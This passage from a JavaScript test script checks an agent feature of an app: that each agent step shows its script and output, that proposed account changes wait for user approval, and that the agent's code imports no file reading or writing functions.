    check('each step shows its script and output', p.toolEntries === 3 && p.scriptShown && p.outputShown);
    check('a proposal changes nothing until the user approves',
        p.pending === 2 && p.accountsBeforeApproval.join() === ACCOUNT && p.accountsAfter.join() === `${ACCOUNT},bob.near` && p.pendingAfter === 0, p.accountsAfter.join());
    await ctx.close();
}

// ---- The boundary, statically: agent code holds no file access ------------------
{
    const dir = path.join(APP_ROOT, 'dataagent');
    const offenders = [];
    for (const name of fs.readdirSync(dir)) {
        const text = fs.readFileSync(path.join(dir, name), 'utf8');
        const allowed = name === 'data-api.js' ? /\bexists\b/ : null;
        for (const match of text.matchAll(/import\s*\{([^}]*)\}\s*from\s*'[^']*gitstorage\.js'/g)) {
            if (!allowed || match[1].trim() !== 'exists') offenders.push(`${name}: ${match[1].trim()}`);
        }
        if (/getDirectory|createSyncAccessHandle|readTextFile|writeFile/.test(text)) offenders.push(`${name}: file API`);
    }
    check('agent code imports no file reading or writing', offenders.length === 0, offenders.join('; '));
}

await browser.close();
server.close();
const failed = results.filter((ok) => !ok).length;
console.log(`\n${results.length - failed}/${results.length} passed`);
process.exit(failed ? 1 : 0);
